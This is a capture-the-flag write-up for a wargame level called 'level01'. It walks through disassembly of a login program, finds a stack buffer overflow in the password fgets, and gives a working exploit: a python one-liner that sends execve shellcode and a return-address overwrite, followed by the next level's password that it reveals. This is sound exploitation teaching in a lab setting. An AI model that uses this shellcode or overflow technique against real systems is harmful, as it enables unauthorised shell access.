# BUFFER OVERFLOW + SHELLCODE

```asm
...
08048464 <verify_user_name>:
...
080484a3 <verify_user_pass>:
...
080484d0 <main>:
...
```
- 3 interesting functions : `main`, `verify_user_name` and `verify_user_pass`

## `verify_user_name`

```shell
(gdb) p (char*) 0x8048690
$1 = 0x8048690 "verifying username....\n"
(gdb) p (char*) 0x804a040
$1 = 0x804a040 ""
(gdb) p (char*) 0x80486a8
$2 = 0x80486a8 "dat_wil"
```

```asm
08048464 <verify_user_name>:
 8048464:	55                   	push   ebp
 8048465:	89 e5                	mov    ebp,esp
 8048467:	57                   	push   edi
 8048468:	56                   	push   esi
 8048469:	83 ec 10             	sub    esp,0x10
 804846c:	c7 04 24 90 86 04 08 	mov    DWORD PTR [esp],0x8048690
 8048473:	e8 08 ff ff ff       	call   8048380 <puts@plt>
 8048478:	ba 40 a0 04 08       	mov    edx,0x804a040
 804847d:	b8 a8 86 04 08       	mov    eax,0x80486a8
 8048482:	b9 07 00 00 00       	mov    ecx,0x7
 8048487:	89 d6                	mov    esi,edx
 8048489:	89 c7                	mov    edi,eax
 804848b:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 804848d:	0f 97 c2             	seta   dl
 8048490:	0f 92 c0             	setb   al
 8048493:	89 d1                	mov    ecx,edx
 8048495:	28 c1                	sub    cl,al
 8048497:	89 c8                	mov    eax,ecx
 8048499:	0f be c0             	movsx  eax,al
 804849c:	83 c4 10             	add    esp,0x10
 804849f:	5e                   	pop    esi
 80484a0:	5f                   	pop    edi
 80484a1:	5d                   	pop    ebp
 80484a2:	c3                   	ret    
```
- The function simply prints context strings, then compares the string at [0x804a040] with "dat_wil" and returns 1 if equal

## `verify_user_pass`

```shell
(gdb) p (char*) 0x80486b0
$1 = 0x80486b0 "admin"
```

```asm
080484a3 <verify_user_pass>:
 80484a3:	55                   	push   ebp
 80484a4:	89 e5                	mov    ebp,esp
 80484a6:	57                   	push   edi
 80484a7:	56                   	push   esi
 80484a8:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 80484ab:	89 c2                	mov    edx,eax
 80484ad:	b8 b0 86 04 08       	mov    eax,0x80486b0
 80484b2:	b9 05 00 00 00       	mov    ecx,0x5
 80484b7:	89 d6                	mov    esi,edx
 80484b9:	89 c7                	mov    edi,eax
 80484bb:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 80484bd:	0f 97 c2             	seta   dl
 80484c0:	0f 92 c0             	setb   al
 80484c3:	89 d1                	mov    ecx,edx
 80484c5:	28 c1                	sub    cl,al
 80484c7:	89 c8                	mov    eax,ecx
 80484c9:	0f be c0             	movsx  eax,al
 80484cc:	5e                   	pop    esi
 80484cd:	5f                   	pop    edi
 80484ce:	5d                   	pop    ebp
 80484cf:	c3                   	ret    
```
- Same as `verify_user_name` but it compares the string given as argument of the function with "admin", return 1 if equal

## `main`

```shell
(gdb) p (char*) 0x80486b8
$2 = 0x80486b8 "********* ADMIN LOGIN PROMPT *********"
(gdb) p (char*) 0x80486df
$3 = 0x80486df "Enter Username: "
```
```asm
080484d0 <main>:
 80484d0:	55                   	push   ebp
 80484d1:	89 e5                	mov    ebp,esp
 80484d3:	57                   	push   edi
 80484d4:	53                   	push   ebx
 80484d5:	83 e4 f0             	and    esp,0xfffffff0
 80484d8:	83 ec 60             	sub    esp,0x60
 80484db:	8d 5c 24 1c          	lea    ebx,[esp+0x1c]
 80484df:	b8 00 00 00 00       	mov    eax,0x0
 80484e4:	ba 10 00 00 00       	mov    edx,0x10
 80484e9:	89 df                	mov    edi,ebx
 80484eb:	89 d1                	mov    ecx,edx
 80484ed:	f3 ab                	rep stos DWORD PTR es:[edi],eax
 80484ef:	c7 44 24 5c 00 00 00 	mov    DWORD PTR [esp+0x5c],0x0
 80484f6:	00 
 80484f7:	c7 04 24 b8 86 04 08 	mov    DWORD PTR [esp],0x80486b8
 80484fe:	e8 7d fe ff ff       	call   8048380 <puts@plt>
 8048503:	b8 df 86 04 08       	mov    eax,0x80486df
 8048508:	89 04 24             	mov    DWORD PTR [esp],eax
 804850b:	e8 50 fe ff ff       	call   8048360 <printf@plt>
```
- Starts by printing context strings

```asm
 8048510:	a1 20 a0 04 08       	mov    eax,ds:0x804a020
 8048515:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 8048519:	c7 44 24 04 00 01 00 	mov    DWORD PTR [esp+0x4],0x100
 8048520:	00 
 8048521:	c7 04 24 40 a0 04 08 	mov    DWORD PTR [esp],0x804a040
 8048528:	e8 43 fe ff ff       	call   8048370 <fgets@plt>
 804852d:	e8 32 ff ff ff       	call   8048464 <verify_user_name>
 8048532:	89 44 24 5c          	mov    DWORD PTR [esp+0x5c],eax
 8048536:	83 7c 24 5c 00       	cmp    DWORD PTR [esp+0x5c],0x0
 804853b:	74 13                	je     8048550 <main+0x80>
 804853d:	c7 04 24 f0 86 04 08 	mov    DWORD PTR [esp],0x80486f0
 8048544:	e8 37 fe ff ff       	call   8048380 <puts@plt>
 8048549:	b8 01 00 00 00       	mov    eax,0x1
 804854e:	eb 5f                	jmp    80485af <main+0xdf>
```
- Write the user input at [0x804a040], then call `verify_user_name` to check if the username is correct
- If the username is correct, jump to following step, otherwise print a string, set exit status to 1 and go to end of main()

```asm
 ...
 80484d8:	83 ec 60             	sub    esp,0x60
 ...
```
```asm
 8048565:	c7 44 24 04 64 00 00 	mov    DWORD PTR [esp+0x4],0x64
 ...
 804856d:	8d 44 24 1c          	lea    eax,[esp+0x1c]
 8048571:	89 04 24             	mov    DWORD PTR [esp],eax
 8048574:	e8 f7 fd ff ff       	call   8048370 <fgets@plt>
 8048579:	8d 44 24 1c          	lea    eax,[esp+0x1c]
 804857d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048580:	e8 1e ff ff ff       	call   80484a3 <verify_user_pass>
```
- Reads the password from stdin (max 0x64, so 100 bytes) and put it at [esp+0x1c], then call `verify_user_pass` with this buffer as parameter
- But buffer size [esp+0x1c] is 64 bytes (0x5c - 0x1c), so we can overflow the buffer by 36 bytes, is it enough to change the behavior of the program ? lets try

## Exploit 

```shell
(gdb) run
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
12345678901234567890123456789012345678901234567890123456789012345678901234567890123 
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x0a333231 in ?? ()
```
- We now have the offset : 80
- lets write a shellcode in the password input and then overwrite the return address to this shellcode
- what is the address of this buffer ?
- We will use the buffer of the username input, which is at [0x804a040]
- [0x804a040] + length("dat_wil") = 0x804a047

```shell
~$ (python -c 'print "dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "A"*80 + "\x47\xa0\x04\x08"' ; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```